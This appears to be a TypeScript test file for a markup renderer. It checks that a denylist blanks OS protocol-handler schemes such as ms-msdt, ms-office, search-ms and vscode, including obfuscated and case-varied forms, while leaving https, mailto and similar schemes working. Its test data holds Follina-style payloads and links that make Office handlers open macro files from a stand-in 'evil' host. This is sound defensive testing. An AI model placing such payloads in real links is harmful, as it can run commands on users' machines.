import { describe, it, expect } from 'vitest'
import { carveToHtml, renderHtml, type Document } from '../src/index.js'

const h = (s: string, opts = {}) => carveToHtml(s, opts)

/**
 * OS protocol-handler / command-execution scheme denylist (CVE-2026-20841
 * class). A markup link a consumer routes to the operating-system handler can
 * open a macro document or run a command - the exact vector behind the Windows
 * Notepad markdown-link CVE (`ms-office:` / `ms-msdt:` OS handler executes a
 * command) and Follina (`ms-msdt:`). These schemes are added to the SAME
 * always-on denylist as `javascript`/`vbscript`/`data`/`file`, so they get the
 * same case-insensitive, obfuscation-resistant matching on link href, image
 * src, autolinks, and `{href=…}` / `{src=…}` attribute overrides.
 *
 * Legitimate non-command schemes (`http`, `https`, `mailto`, `tel`, `ftp`,
 * `sms`) MUST stay allowed.
 */
describe('OS protocol-handler scheme denylist (CVE-2026-20841 class)', () => {
  // The full set added to DANGEROUS_URL_SCHEMES, with a representative payload.
  const blocked: Array<[string, string]> = [
    ['ms-msdt', 'ms-msdt:/id'],
    ['ms-office', 'ms-office:ofe|u|http://evil/x.docm'],
    ['ms-word', 'ms-word:ofe|u|http://evil/x.docx'],
    ['ms-excel', 'ms-excel:ofe|u|http://evil/x.xlsm'],
    ['ms-powerpoint', 'ms-powerpoint:ofe|u|http://evil/x.pptm'],
    ['ms-access', 'ms-access:ofe|u|http://evil/x.accdb'],
    ['ms-visio', 'ms-visio:ofe|u|http://evil/x.vsdx'],
    ['ms-project', 'ms-project:ofe|u|http://evil/x.mpp'],
    ['ms-publisher', 'ms-publisher:ofe|u|http://evil/x.pub'],
    ['ms-infopath', 'ms-infopath:ofe|u|http://evil/x.xsn'],
    ['ms-spd', 'ms-spd:foo'],
    ['ms-search', 'ms-search:query'],
    ['search-ms', 'search-ms:query=foo&crumb=location'],
    ['ms-cxh', 'ms-cxh:foo'],
    ['ms-cxh-full', 'ms-cxh-full:foo'],
    ['shell', 'shell:foo'],
    ['vscode', 'vscode://file/x'],
    ['vscode-insiders', 'vscode-insiders://file/x'],
    ['jar', 'jar:http://evil/x.jar!/y'],
  ]

  for (const [scheme, url] of blocked) {
    it(`blanks ${scheme}: on a link href`, () => {
      expect(h(`[x](${url})`)).toBe('<p><a href="">x</a></p>')
    })
  }

  it('blanks ms-office: on an image src (block image)', () => {
    expect(h('![x](ms-office:ofe|u|http://evil/x.docm)')).toBe('<img src="" alt="x">')
  })

  it('blanks an OS-handler scheme case-insensitively', () => {
    expect(h('[x](MS-OFFICE:ofe|u|payload)')).toBe('<p><a href="">x</a></p>')
    expect(h('[x](Ms-Msdt:/id)')).toBe('<p><a href="">x</a></p>')
    expect(h('[x](VSCode://file/x)')).toBe('<p><a href="">x</a></p>')
  })

  it('blanks an OS-handler scheme in an autolink', () => {
    expect(h('<ms-msdt:/id>')).toBe('<p><a href="">ms-msdt:/id</a></p>')
    expect(h('<vscode://file/x>')).toBe('<p><a href="">vscode://file/x</a></p>')
  })

  it('drops an OS-handler {href=…} override (override is sanitized too)', () => {
    expect(h('[x](https://safe){href="ms-office:ofe|u|payload"}')).toBe(
      '<p><a href="https://safe">x</a></p>',
    )
  })

  it('drops an OS-handler {src=…} override on an image', () => {
    expect(h('![x](https://safe/i.png){src="ms-msdt:/id"}')).toBe(
      '<img src="https://safe/i.png" alt="x">',
    )
  })

  it('blanks an OS-handler scheme obfuscated with an embedded control char', () => {
    // Direct renderHtml callers may hand-build an AST, bypassing the parser's
    // link-target validation. The renderer's scheme probe strips C0 controls /
    // whitespace before matching, so `ms-\toffice:` is still caught - matching
    // the javascript: defenses.
    const linkDoc = (href: string): Document => ({
      type: 'document',
      children: [
        {
          type: 'paragraph',
          children: [{ type: 'link', href, children: [{ type: 'text', value: 'x' }] }],
        },
      ],
    })
    expect(renderHtml(linkDoc('ms-\toffice:ofe'))).toBe('<p><a href="">x</a></p>')
    expect(renderHtml(linkDoc('  ms-msdt:/id'))).toBe('<p><a href="">x</a></p>')
  })
})

describe('OS protocol-handler denylist (legitimate schemes still pass)', () => {
  const allowed: Array<[string, string, string]> = [
    ['https', '[x](https://ok.com)', '<p><a href="https://ok.com">x</a></p>'],
    ['http', '[x](http://ok.com)', '<p><a href="http://ok.com">x</a></p>'],
    ['mailto', '[x](mailto:a@b.com)', '<p><a href="mailto:a@b.com">x</a></p>'],
    ['tel', '[x](tel:+15551234)', '<p><a href="tel:+15551234">x</a></p>'],
    ['ftp', '[x](ftp://h/f)', '<p><a href="ftp://h/f">x</a></p>'],
    ['sms', '[x](sms:+15551234)', '<p><a href="sms:+15551234">x</a></p>'],
  ]

  for (const [scheme, input, expected] of allowed) {
    it(`allows ${scheme}: unchanged`, () => {
      expect(h(input)).toBe(expected)
    })
  }

  it('does not blank a relative URL that merely starts with "ms-"', () => {
    // No colon -> no scheme -> not a denylist match. `ms-foo/bar` is a path.
    expect(h('[x](ms-foo/bar)')).toBe('<p><a href="ms-foo/bar">x</a></p>')
  })
})
